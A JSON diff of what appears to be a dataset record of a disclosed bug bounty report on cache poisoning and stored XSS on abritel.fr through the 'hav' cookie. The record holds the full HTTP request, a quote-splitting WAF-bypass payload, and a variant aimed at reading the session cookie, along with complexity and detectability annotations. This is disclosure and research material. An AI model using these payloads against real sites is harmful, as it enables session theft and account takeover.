@@ -1,42 +1,46 @@
 {
-    "reported_to": "Expedia Group Bug Bounty",
-    "reported_by": "bombon ",
-    "title": "Cache Poisoning Allows Stored XSS Via hav Cookie Parameter (To Account Takeover)",
-    "content": "\nSummary:\nReport #1698316 was closed as resolved\nYou told me that the stored XSS was going to be resolved since \"As this relies on the same root cause, we will be closing it as duplicate\", but no\nabritel.fr has a strong WAF, however the server hides double quotes, allowing to bypass the WAF\ne.g\nThe server blocks </scriptbut if I send </sc\"ript>\nWAF is bypassed and the output is </script>\nSteps To Reproduce:\n1-> Send this request\nCode 679 Bytes\n1GET /annonces/location-vacances/france_midi-pyrenees_46_stcere_dt0.php.js?xxxd HTTP/2\n2Host: www.abritel.fr\n3Cookie: hav=xss\"</sc\"ript><sv\"g/onloa\"d=aler\"t\"(document.doma\"in)>\n4User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\n5Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n6Accept-Language: en-US,en;q=0.5\n7Accept-Encoding: gzip, deflate\n8Referer: https://www.abritel.fr/signup?enable_registration=true&redirectTo=%2Fsearch%2Fkeywords%3Asoissons-france-%28xss%29%2FminNightlyPrice%2F0%3FpetIncluded%3Dfalse%26filterByTotalPrice%3Dtrue%26ssr%3Dtrue&referrer_page_location=serp\n9Upgrade-Insecure-Requests: 1\n10Te: trailers\n2-> Using another browser visit:\nhttps://www.abritel.fr/annonces/location-vacances/france_midi-pyrenees_46_stcere_dt0.php.jpeg?xxxd\nExploit:\nThis is the payload to extract the HASESSIONV3\nxss\"</sc\"ript><sv\"g/onloa\"d=aler\"t\"(window.INITIAL_STATE.system.cookie)>\nSupporting Material/References:\nImpact\nStored XSS to Account Takeover\n\n",
-    "severity": [
-        8.2,
-        null
+  "reported_to": "Expedia Group Bug Bounty",
+  "reported_by": "bombon ",
+  "title": "Cache Poisoning Allows Stored XSS Via hav Cookie Parameter (To Account Takeover)",
+  "content": "\nSummary:\nReport #1698316 was closed as resolved\nYou told me that the stored XSS was going to be resolved since \"As this relies on the same root cause, we will be closing it as duplicate\", but no\nabritel.fr has a strong WAF, however the server hides double quotes, allowing to bypass the WAF\ne.g\nThe server blocks </scriptbut if I send </sc\"ript>\nWAF is bypassed and the output is </script>\nSteps To Reproduce:\n1-> Send this request\nCode 679 Bytes\n1GET /annonces/location-vacances/france_midi-pyrenees_46_stcere_dt0.php.js?xxxd HTTP/2\n2Host: www.abritel.fr\n3Cookie: hav=xss\"</sc\"ript><sv\"g/onloa\"d=aler\"t\"(document.doma\"in)>\n4User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\n5Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n6Accept-Language: en-US,en;q=0.5\n7Accept-Encoding: gzip, deflate\n8Referer: https://www.abritel.fr/signup?enable_registration=true&redirectTo=%2Fsearch%2Fkeywords%3Asoissons-france-%28xss%29%2FminNightlyPrice%2F0%3FpetIncluded%3Dfalse%26filterByTotalPrice%3Dtrue%26ssr%3Dtrue&referrer_page_location=serp\n9Upgrade-Insecure-Requests: 1\n10Te: trailers\n2-> Using another browser visit:\nhttps://www.abritel.fr/annonces/location-vacances/france_midi-pyrenees_46_stcere_dt0.php.jpeg?xxxd\nExploit:\nThis is the payload to extract the HASESSIONV3\nxss\"</sc\"ript><sv\"g/onloa\"d=aler\"t\"(window.INITIAL_STATE.system.cookie)>\nSupporting Material/References:\nImpact\nStored XSS to Account Takeover\n\n",
+  "severity": [
+    8.2,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Cross-site Scripting (XSS) - Stored"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1680393540,
+  "report_url": "https://hackerone.com/reports/1760213",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "HIGH",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Send a crafted HTTP request with a malicious payload in the 'hav' cookie parameter that bypasses WAF by using double quotes to hide script tags."
     ],
-    "bounty": null,
-    "weaknesses": [
-        "Cross-site Scripting (XSS) - Stored"
-    ],
-    "screenshots": {},
-    "disclosed_date": 1680393540,
-    "report_url": "https://hackerone.com/reports/1760213",
-    "is_multi_component": true,
-    "complexity": "HIGH",
-    "novelty": "HIGH",
-    "vuln_category": "WEB_APP",
-    "steps": [
-        [
-            1,
-            "Send a crafted HTTP request with a malicious payload in the 'hav' cookie parameter that bypasses WAF by using double quotes to hide script tags."
-        ],
-        [
-            2,
-            "Visit the affected URL in another browser to trigger the stored XSS payload, which can extract sensitive session information like HASESSIONV3."
-        ]
-    ],
-    "vuln_description": "The vulnerability is a stored XSS via the 'hav' cookie parameter that bypasses WAF protections by exploiting the server's behavior of hiding double quotes. This allows an attacker to inject malicious JavaScript, leading to potential account takeover by extracting session cookies.",
-    "reason": "The attack involves understanding WAF bypass techniques and crafting a payload that leverages server-side behavior to hide malicious code. However, the core XSS mechanism is straightforward once the bypass method is identified.",
-    "new_complexity": "MEDIUM",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": "1698316",
-    "authnz_metadata": {
-        "reason": "The vulnerability involves a stored XSS via cookie manipulation, which is a client-side issue rather than an authentication/authorization boundary crossing. The methodology described focuses on testing AuthN/AuthZ boundaries by swapping sessions, actions, or resource IDs within the same application context. The XSS vulnerability does not fit this pattern as it does not involve unauthorized access to resources or functionality but rather exploits a rendering flaw in the application.",
-        "is_detectable": false
-    }
+    [
+      2,
+      "Visit the affected URL in another browser to trigger the stored XSS payload, which can extract sensitive session information like HASESSIONV3."
+    ]
+  ],
+  "vuln_description": "The vulnerability is a stored XSS via the 'hav' cookie parameter that bypasses WAF protections by exploiting the server's behavior of hiding double quotes. This allows an attacker to inject malicious JavaScript, leading to potential account takeover by extracting session cookies.",
+  "reason": "The attack involves understanding WAF bypass techniques and crafting a payload that leverages server-side behavior to hide malicious code. However, the core XSS mechanism is straightforward once the bypass method is identified.",
+  "new_complexity": "MEDIUM",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": "1698316",
+  "authnz_metadata": {
+    "reason": "The vulnerability involves a stored XSS via cache poisoning, which is a client-side issue rather than an authentication or authorization bypass. The methodology described focuses on testing AuthN/AuthZ boundaries by swapping user sessions and resource IDs, which does not apply to XSS vulnerabilities. XSS vulnerabilities typically require different detection methods, such as input validation testing or dynamic analysis of client-side code execution.",
+    "is_detectable": false
+  },
+  "injection_metadata": {
+    "reasoning": "The vulnerability relies on a WAF bypass technique involving server-side quote removal, which requires a non-generic payload structure (</sc\"ript>). While the methodology would detect the 'hav' cookie as injectable and test with simple payloads, the specific quote-splitting bypass technique would not be covered under 'common permutations' since it requires knowledge of server-specific filtering behavior. The stored XSS trigger requires cache poisoning to manifest for other users, which depends on server caching behavior not explicitly covered in the 'regular navigation' detection phase.",
+    "is_simple_injection": false
+  }
 }
